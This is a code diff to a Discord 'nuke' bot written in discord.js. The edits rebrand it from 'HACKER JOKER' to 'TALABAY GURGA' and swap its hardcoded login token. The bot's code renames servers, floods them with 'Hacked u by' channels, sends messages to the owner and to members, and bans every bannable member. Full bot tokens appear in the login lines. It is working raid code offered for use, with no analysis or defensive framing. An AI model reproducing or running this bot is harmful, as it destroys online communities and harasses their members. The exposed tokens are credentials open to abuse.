@@ -46,7 +46,7 @@ LOka.user.setUsername("HACKER JOKER")
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`HACKER JOKER`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`#help`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -61,7 +61,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setName(`HACKER JOKER`)
+             m.setName(`HA`)
 })
 }
 });
@@ -564,7 +564,7 @@ m.createChannel('Hacked u by JOKER', 'voice');
                    
                    
         
- m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
 m.createChannel('Hacked u by JOKER', 'voice');
@@ -597,14 +597,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' SERVART BAGAN CHU').catch(e => { return void e; });
+  await guild.owner.send('HACK BY TALABAY G̷ U̷ R̷ G̷ A̷ 🛠').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('^WALA HACKERAN^').catch(e => { return void e; });
+      await m.send('^HACK BY TALABAY G̷ U̷ R̷ G̷ A̷ 🛠^').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -616,9 +616,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by JOKER', 'text');
+    await guild.createChannel('LETAY PURT', 'text');
  
-      await guild.createChannel('Hacked u by JOKER', 'voice');
+      await guild.createChannel('Hacked u by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
  
  
  
@@ -658,4 +658,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("Njg0NjA5MTI4MjYxMjIyNDIz.Xl8mig.XpNx_GBVoJQx8j-sNPa0NnoTu7E")
+LOka.login("Njg3NDAxNTE0NTE1NDMxNDkw.XmlSpw.oEgPBsHK8OiMpCB5QjcYBbu7clw")
